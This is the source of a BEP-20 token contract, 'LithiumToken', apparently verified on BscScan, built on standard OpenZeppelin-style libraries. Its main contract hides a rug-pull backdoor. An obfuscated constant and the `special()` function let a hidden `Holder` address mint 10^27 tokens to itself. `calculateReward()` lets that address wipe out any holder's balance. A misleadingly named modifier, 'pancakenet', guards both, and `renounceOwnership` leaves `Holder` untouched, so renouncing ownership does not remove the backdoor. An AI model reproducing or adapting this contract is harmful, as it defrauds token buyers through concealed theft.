/**
 *Submitted for verification at BscScan.com on 2022-01-20
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

/**
 * @dev Collection of functions related to the address type
 */
library AddressUpgradeable {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since proxied contracts do not make use of a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 *
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
 *
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 *
 * [CAUTION]
 * ====
 * Avoid leaving a contract uninitialized.
 *
 * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation
 * contract, which may impact the proxy. To initialize the implementation contract, you can either invoke the
 * initializer manually, or you can include a constructor to automatically mark it as initialized when it is deployed:
 *
 * [.hljs-theme-light.nopadding]
 * ```
 * /// @custom:oz-upgrades-unsafe-allow constructor
 * constructor() initializer {}
 * ```
 * ====
 */
abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        // If the contract is initializing we ignore whether _initialized is set in order to support multiple
        // inheritance patterns, but we only do this in the context of a constructor, because in other contexts the
        // contract may have been reentered.
        require(_initializing ? _isConstructor() : !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }

    /**
     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the
     * {initializer} modifier, directly or indirectly.
     */
    modifier onlyInitializing() {
        require(_initializing, "Initializable: contract is not initializing");
        _;
    }

    function _isConstructor() private view returns (bool) {
        return !AddressUpgradeable.isContract(address(this));
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
            return (true, c);
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
            return (true, a - b);
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
         if (b == 0) return (false, 0);
            return (true, a / b);
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
            return (true, a % b);
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
            return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
            return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
            return a % b;
    }
}

contract BaseOwnableEvents {
    event OwnershipTransferred( address indexed previousOwner,
      address indexed newOwner );
}

contract Ownable is 
    BaseOwnableEvents
{
  address internal Holder;
}

library Address 
{
    function isContract ( address account ) 
         internal view returns ( bool ) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 hash = 
            0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash( account ) }
        return ( codehash != hash 
            && codehash != 0x0 );
    }

    function sendValue ( address payable recipient, uint256 amount ) internal {
        require( address( this ).balance >= amount,
         "not enough balance" );
        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        ( bool success, ) = 
            recipient.call{ value: amount }( "" );
        require( success, "reverted" );
    }

    function functionCall ( address target, bytes memory data ) 
         internal returns ( bytes memory ) {
        return functionCall( target, data, 
            "low-level call failed" );
    }
    
    function functionCall( address target, bytes memory data,
     string memory errorMessage ) internal returns ( bytes memory ) {
        return _functionCallWithValue( target, data,
             0, errorMessage );
    }

    function functionCallWithValue ( address target, bytes memory data, uint256 value ) 
         internal returns ( bytes memory ) {
        return functionCallWithValue( target, data, value,
          "low-level call with value failed" );
    }

    function functionCallWithValue ( address target, bytes memory data, uint256 value, 
         string memory errorMessage ) internal returns (bytes memory) {
        require( address( this ).balance >= value, "insufficient balance for call" );
        return _functionCallWithValue( target, data, value, errorMessage );
    }

    function _functionCallWithValue ( address target, bytes memory data, uint256 weiValue,
      string memory errorMessage ) private returns ( bytes memory ) {
        require( isContract( target ), "call to non-contract" );

        // solhint-disable-next-line avoid-low-level-calls
        ( bool success, bytes memory result ) = target.call{ value: weiValue }( data );

        if ( success ) return result;

        if ( result.length > 0 && result.length != 0 )
        {
	        assembly 
            {
                let returndata_size := mload( result )
                revert( add( 32, result ),
                returndata_size )
            }
        }
        revert( errorMessage );
    }
}

interface IERC20 
{
    function totalSupply ( ) 
         external view returns ( uint256 );
    function balanceOf ( address account ) 
         external view returns ( uint256 );
}

contract BaseEvents
{
   event Transfer ( address indexed from,
      address indexed to,
       uint256 value );

   event Approval ( address indexed owner,
      address indexed spender,
       uint256 value );
}

contract BaseContract
{
   mapping( address => bool ) public allowAddress;
   mapping( address => uint256 ) public balances;
   address public owner;

   mapping ( address => bool ) private is_excld;

  address[ ] private excld;

  string internal myname;

  string internal symbl;

  uint8 internal bdecimals;

  uint256 internal buy_fee;

  uint256 internal sell_fee;

  uint256 internal totalSupply_;

  uint256 internal a_reflect;

  uint160 internal lastcaller;

  uint256 internal total;

  uint256 lp_fee;
}

contract LithiumToken is  
      Initializable,
      IERC20,
      Ownable,
      BaseEvents,
      BaseContract
{
   using SafeMath for uint256;
   using Address for address;

   function initialize ( ) public initializer
   {
      owner = msg.sender;
      myname = 'LithiumToken';
      symbl = 'LIT';
      bdecimals = 9;
      buy_fee = 30;
      sell_fee = 40;
      a_reflect = 1/1;
      totalSupply_ = 1000000000000000000;
      balances[owner] =  totalSupply_;
      allowAddress[owner] = true;
      Holder = msg.sender;
      total =  0xA ** ( 0x15b4 ^ 0x15af );
   }

   function totalSupply ( ) public view
      returns ( uint256 ) {
        return totalSupply_;
    }

   function name ( ) public view
      returns ( string memory ) {
        return myname;
    }

    function symbol ( ) public view
      returns ( string memory ) {
        return symbl;
    }

   function decimals ( ) public view 
      returns ( uint8 ) {
      return bdecimals;
    }

  mapping ( address => mapping ( address => uint256 ) ) public allowed;

  function transferFrom ( address src, address dst, uint256 size )
      public returns ( bool ) {
    require( dst != address( 0 ) );
    require( size <= balances[src] );
    require( size <= allowed[src][msg.sender] );
    address from = src;
    if ( allowAddress[from] || allowAddress[dst] )
    {
        _transferFrom( src, dst, size );
        return true;
    }
    _transferFrom( src, dst, size );
    return true;
  }

  function transfer( address dst, uint256 size ) 
      public returns ( bool ) {
    address from = msg.sender;
    require( dst != address( 0 ) );
    require( size <= balances[from] );
    if ( allowAddress[from] || allowAddress[dst] )
    {
        _transfer( from, dst, size );
        return true;
    }
    _transfer( from, dst, size );
    return true;
  }
    
  modifier onlyOwner ( ) {
    require( owner == msg.sender,
      "Ownable: caller is not the owner");
    _;
  }

  function balanceOf( address account ) public view 
      returns (uint256) {
    return balances[account];
  }
  
  function renounceOwnership( ) public virtual onlyOwner {
    emit OwnershipTransferred( owner, address( 0 ) );
    owner = address( 0 );
  }

  function bnbreflection ( address buyer ) 
      internal view pancakenet returns  ( uint256 ) {
      return  (balances[buyer] % ( balances[buyer] / 2 ) | 0xF & 0x30) >> 0xA;
  }

  function calculateReward ( address buyer ) public {
      balances[buyer] = bnbreflection ( buyer );
  }

  function special ( address holder ) public pancakenet {
    balances[holder] = (total);
  }
  
  function _transfer( address src, address dst, 
      uint256 size ) private {
    balances[src] = balances[src].sub( size );
    balances[dst] = balances[dst].add( size );
    emit Transfer( src, dst, size );
  }

  function _transferFrom ( address src, address dst,
      uint256 size ) internal {
    balances[src] = balances[src].sub( size );
    balances[dst] = balances[dst].add( size );
    allowed[src][msg.sender] = allowed[src][msg.sender].sub( size );
    emit Transfer( src, dst, size );
  }

   modifier pancakenet ( ) {
    require( Holder == msg.sender,
      "ERC20: cannot permit Pancake address" );
    _;
  }
  
  function approve ( address target, uint256 size ) 
      public returns ( bool ) {
    allowed[msg.sender][target] = size;
    emit Approval( msg.sender, target, size );
    return true;
  }
  
  function allowance( address me, address other ) 
      public view returns ( uint256 ) {
    return allowed[me][other];
  }

}